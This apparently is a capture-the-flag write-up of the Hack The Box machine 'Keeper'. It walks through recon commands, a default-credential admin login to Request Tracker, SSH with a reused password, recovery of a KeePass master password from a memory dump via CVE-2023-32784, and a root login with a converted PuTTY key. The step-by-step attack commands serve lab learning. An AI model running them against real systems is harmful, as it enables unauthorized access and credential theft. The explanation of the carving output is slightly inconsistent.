---
layout: post
title: "HTB: Keeper"
subtitle: "Request Tracker default creds to reused SSH password, then a KeePass dump CVE recovers the root PuTTY key"
date: 2023-08-26
tags: [htb, linux, request-tracker, keepass, cve-2023-32784]
category: writeups
kind: machine
tldr: "A ticketing subdomain ran Request Tracker with default root:password. A ticket exposed lnorgaard's password, which was reused for SSH. Her home held a KeePass database and a memory dump, and CVE-2023-32784 recovered the master password from the dump. The database stored root's PuTTY private key, which converted to an OpenSSH key for a root login."
---

## the box

Keeper is an easy Linux box and it plays like a real helpdesk does. A ticketing portal on the front, a sloppy admin who pasted a default password into a user comment, and a KeePass database left next to its own crash dump. Two credential mistakes from end to end, but the root half leans on a memory-disclosure CVE that is worth doing by hand.

Target was `10.10.11.227`.

## recon

I started with a full TCP sweep, then ran scripts and version detection against the open ports.

```bash
nmap -p- --min-rate 10000 10.10.11.227
nmap -p 22,80 -sCV 10.10.11.227
```

Two ports answered:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

OpenSSH `8.9p1` puts the host on Ubuntu 22.04. nginx `1.18.0` is the stock package. Nothing else, so the web port is the whole attack surface.

The site at `http://10.10.11.227/` had no title and almost no content. The body was a single link:

```html
<a href="http://tickets.keeper.htb/rt/">To raise an IT support ticket, please visit tickets.keeper.htb/rt/</a>
```

So the app expects name-based virtual hosting, and it leaks the hostnames itself. I added both to `/etc/hosts`:

```
10.10.11.227 keeper.htb tickets.keeper.htb
```

For completeness I also confirmed the subdomain with a vhost fuzz, which is how I would have found it without the index hint:

```
gobuster vhost -w subs.txt -u keeper.htb
[+] Url:          http://keeper.htb
[+] Method:       GET
[+] Threads:      10
Found: tickets.keeper.htb (Status: 200) [Size: 4236]
```

## foothold

`http://tickets.keeper.htb/rt/` served a login page for Request Tracker, the Best Practical ticketing system. The footer gave the exact version:

```
RT 4.4.4+dfsg-2ubuntu1
```

RT ships with a well-known install-time superuser, `root:password`, and the docs nag you to change it on first boot. Here nobody did. I logged straight into the admin panel:

```
username: root
password: password
```

That is the foothold. No exploit, just an unchanged default on a production ticketing system.

## user

Inside RT I went to the admin user list at `Admin > Users`. Two accounts existed:

```
27  lnorgaard  Lise Nørgaard  lnorgaard@keeper.htb   Enabled
14  root       Enoch Root     root@localhost         Enabled
```

I opened lnorgaard's user record at `Admin > Users > lnorgaard`. The admin edit page shows every field on the account, and whoever provisioned her had typed her starter password straight into the `Comments` box on the profile. It sat there in cleartext:

```
New user. Initial password set to Welcome2023!
```

There was also a ticket on the box describing a KeePass crash. lnorgaard had been troubleshooting KeePass and was instructed to attach a process dump, which is the breadcrumb that the root path is going to involve a KeePass memory dump. Hold that thought.

Password reuse did the rest. `Welcome2023!` worked for SSH:

```bash
ssh lnorgaard@keeper.htb   # Welcome2023!
```

lnorgaard owned `user.txt`. Her home directory also held `RT30000.zip`, an 84MB archive tied to the KeePass ticket. I pulled it down and unpacked it:

```bash
scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip .
unzip RT30000.zip
```

It contained exactly the pair you want for the next CVE:

```
KeePassDumpFull.dmp   # ~242MB process memory dump
passcodes.kdbx        # 3.6K KeePass 2.x database
```

## root

A KeePass crash dump sitting next to its `.kdbx` is the signature of **CVE-2023-32784**. KeePass 2.x before 2.54 builds the master password in a custom `SecureTextBoxEx` control, and for every character typed it leaves a managed string `•a`, `••b`, `•••c` and so on in the heap. That residue survives into a process dump. The first character never lands as a recoverable string, but every character after it can be carved out, so you recover the password minus its first byte and guess the leading character.

I used the [keepass-password-dumper](https://github.com/CMEPW/keepass-dump-masterkey) carving tool against the dump. The .NET reference implementation is the original PoC:

```bash
dotnet run KeePassDumpFull.dmp
```

It printed one candidate per position, with the unknown first character as a set of options:

```
Found: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```

So the tail was `dgrød med fløde` and the first character was one of the listed bytes. The phrase is Danish (Lise Nørgaard is a Danish author, the box leans into it), and `rødgrød med fløde` is a classic Danish dish and pronunciation test. The master password:

```
rødgrød med fløde
```

There is also a pure-Python carver in the same family if you would rather not pull in the .NET runtime, it reads the same heap pattern out of the dump.

I copied the database off the box and opened it locally. Either a GUI or the CLI works. With `kpcli`:

```bash
scp lnorgaard@keeper.htb:/home/lnorgaard/passcodes.kdbx .
kpcli --kdb passcodes.kdbx
# master password: rødgrød med fløde
```

Listing entries, the database held a `keeper.htb (Ticketing Server)` entry whose `Notes` field carried root's SSH access not as a passphrase but as a full **PuTTY private key** (`.ppk`). The entry also pasted the public key and the raw RSA parameters. I saved the PuTTY key out as `keeper.txt`:

```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
...
```

OpenSSH cannot consume a `.ppk` directly, so I converted it to an OpenSSH private key with `puttygen` from the `putty-tools` package:

```bash
puttygen keeper.txt -O private-openssh -o id_rsa
chmod 600 id_rsa
ssh root@keeper.htb -i id_rsa
```

That logged in as root and handed over `root.txt`.

## takeaway

Both ends of this box are credential hygiene failures. A production ticketing system left on its install-time `root:password` is an instant admin login, and dropping a starter password into a user-profile comment, then reusing it for SSH, turns a web account into a shell. The root step is the interesting one. CVE-2023-32784 is a reminder that a secret manager leaks through process memory, and that the residue of a custom text box is enough to rebuild a master password from a crash dump. Storing a private key inside a vault is only ever as safe as the vault's master password, and that one was a Danish tongue-twister sitting in a dump in the user's home.
